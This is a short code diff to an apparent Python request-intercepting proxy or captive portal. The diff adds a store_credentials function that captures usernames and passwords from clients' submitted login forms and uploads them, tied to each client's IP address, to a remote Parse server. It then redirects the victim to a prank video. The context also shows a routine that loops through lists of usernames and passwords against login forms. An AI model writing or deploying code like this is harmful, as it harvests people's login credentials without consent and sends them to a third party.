@@ -51,6 +51,14 @@ def add_visited(ip, url):
     return False
   return True
 
+def store_credentials(ip, url, u, p):
+  obid = get_client_obid(ip)
+  if obid is None:
+    return
+  data = json.dumps({"credentials":{"__op":"AddUnique","objects":[(url, u, p)]}})
+  r = requests.put(PARSE + CLASSES + CLIENT + '/' + obid, headers=HEADERS, data=data)
+  return True
+
 def insecure_login(form):
   for u in USERNAME:
     for p in PASSWORD:
@@ -85,6 +93,7 @@ def catch_all(path):
     print "POST REQUEST: "
     print request.form
     if (u, p):
+      store_credentials(request.remote_addr, url, u, p)
       return redirect("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
     r = requests.post(url, data=dict(request.form))
   else:
